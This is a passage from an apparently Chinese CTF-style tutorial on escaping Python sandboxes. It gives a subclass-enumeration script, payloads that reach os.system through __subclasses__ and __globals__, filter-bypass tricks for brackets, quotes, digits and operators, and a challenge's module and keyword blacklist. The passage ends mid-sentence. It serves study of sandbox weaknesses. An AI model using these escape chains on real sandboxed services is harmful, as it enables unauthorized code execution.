class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">object</span>.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = <span class="built_in">object</span>.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(i=i, method=method))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = <span class="built_in">__import__</span>(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = <span class="built_in">dir</span>(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> <span class="built_in">dir</span>(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = <span class="built_in">str</span>(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.<span class="built_in">format</span>(t=t, method=method))</span><br></pre></td></tr></table></figure>
<h4 id="思路一实例"><a class="markdownIt-Anchor" href="#思路一实例"></a> 思路一实例</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">37</span>].__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">29</span>].__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h4 id="思路二实例"><a class="markdownIt-Anchor" href="#思路二实例"></a> 思路二实例</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="思路三实例"><a class="markdownIt-Anchor" href="#思路三实例"></a> 思路三实例</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="思路三特例"><a class="markdownIt-Anchor" href="#思路三特例"></a> 思路三特例</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="思路四实例"><a class="markdownIt-Anchor" href="#思路四实例"></a> 思路四实例</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].append.__class__.__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h2>
<h3 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤 [ ]</h3>
<p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.get(<span class="string">&#x27;linecache&#x27;</span>).os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;macr0phag3\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>当然，dict 也是可以 pop 的：<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p>
<p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 <code>max</code> 之类的玩意。</p>
<h3 id="过滤引号"><a class="markdownIt-Anchor" href="#过滤引号"></a> 过滤引号</h3>
<blockquote>
<p>chr</p>
</blockquote>
<p>最简单就是用 <code>chr</code> 啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">104</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>扣字符</p>
</blockquote>
<p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p>
<p>如果 str 被过滤了怎么办呢？<code>type('')()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p>
<blockquote>
<p>格式化字符串</p>
</blockquote>
<p>那过滤了引号，格式化字符串还能用吗？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">chr</span>(<span class="number">37</span>)+<span class="built_in">str</span>(&#123;&#125;.__class__)[<span class="number">1</span>])%<span class="number">100</span> == <span class="string">&#x27;d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>又起飞了…</p>
<blockquote>
<p>dict() 拿键它不香吗？</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;whoami&#x27;</span> ==</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] ==</span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">2</span>:<span class="number">8</span>] ==</span><br></pre></td></tr></table></figure>
<h3 id="限制数字"><a class="markdownIt-Anchor" href="#限制数字"></a> 限制数字</h3>
<p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p>
<ol>
<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
<li>1：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
<li>获取稍微大的数字：<code>len(str(&#123;&#125;.keys))</code>，不过需要慢慢找长度符合的字符串</li>
<li>1.0：<code>float(True)</code></li>
<li>-1：<code>~0</code></li>
<li>…</li>
</ol>
<p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p>
<h3 id="限制空格"><a class="markdownIt-Anchor" href="#限制空格"></a> 限制空格</h3>
<p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[i for i in range(10) if i == 5]</span>` 可以替换为 `<span class="selector-attr">[[i]</span><span class="selector-attr">[0]</span><span class="built_in">for</span>(i)<span class="built_in">in</span>(<span class="built_in">range</span>(<span class="number">10</span>))<span class="built_in">if</span>(i)==<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="限制运算符"><a class="markdownIt-Anchor" href="#限制运算符"></a> 限制运算符</h3>
<p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p>
<p><code>==</code> 可以用 <code>in</code> 来替换。</p>
<p>替换 <code>or</code> 的测试代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>上面这几个表达式都可以替换掉 <code>or</code></p>
<p>替换 <code>and</code> 的测试代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>上面这几个表达式都可以替换掉 <code>and</code></p>
<h3 id="限制"><a class="markdownIt-Anchor" href="#限制"></a> 限制 ( )</h3>
<p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p>
<ul>
<li>利用装饰器 <code>@</code></li>
<li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code>，</li>
</ul>
<h3 id="利用新特性"><a class="markdownIt-Anchor" href="#利用新特性"></a> 利用新特性</h3>
<p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门🚪</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门🚪</a>。所以我们就有了一种船新的利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">macr0phag3</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>关注每次版本增加的新特性，或许能淘到点宝贝。</p>
<h3 id="利用反序列化攻击"><a class="markdownIt-Anchor" href="#利用反序列化攻击"></a> 利用反序列化攻击</h3>
<p>反序列化攻击也是能用来逃逸</p>
<p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>
<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p>
